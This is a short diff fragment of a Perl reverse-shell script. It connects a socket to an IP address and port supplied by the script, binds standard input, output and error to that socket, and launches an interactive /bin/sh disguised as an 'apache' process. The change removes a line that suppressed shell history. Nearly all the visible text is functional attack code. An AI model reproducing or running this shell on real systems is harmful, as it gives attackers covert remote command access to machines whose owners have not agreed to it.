@@ -4,5 +4,4 @@ connect(SOCK, sockaddr_in($port,inet_aton($ip)));
 open(STDIN, ">&SOCK");
 open(STDOUT,">&SOCK");
 open(STDERR,">&SOCK");
-$ENV{'HISTFILE'} = '/dev/null';
 exec({"/bin/sh"} ("apache", "-i"));
